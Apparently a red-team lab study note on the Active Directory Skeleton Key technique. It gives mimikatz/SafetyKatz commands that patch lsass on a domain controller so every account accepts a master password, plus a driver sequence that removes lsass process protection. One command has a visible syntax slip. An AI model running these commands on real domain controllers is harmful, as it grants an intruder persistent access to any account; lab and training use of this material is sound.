Skeleton key is a persistence technique where it is possible to patch a Domain Controller (`lsass process`), so that it allows access as any user with a single password. 

All the publicly known methods are not persistent across reboots.

>[!Warning] You need Domain Administration privileges to do it.

To inject a skeleton key on a domain controller we can do:
```powershell
Safetykatz.exe '"privilege::debug" "misc:skeleton""' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


Now it is possible to access any machine with a valid username and password as "`mimikatz`"
```powershell
Enter-PSSession -computerName dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
```

`Skeleton Key` is not opsec safe and is also known to cause issues with AD CS.

### If lsass is running as a protected process
In case Lsass is run as protected process we can still use Skeleton Key but it needs the mimikatz driver (`mimidriv.sys`) on disk of the target DC:
```powershell
privilege::Debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```
- ![[Pasted image 20261124143420.png|612]]

Very noisy.

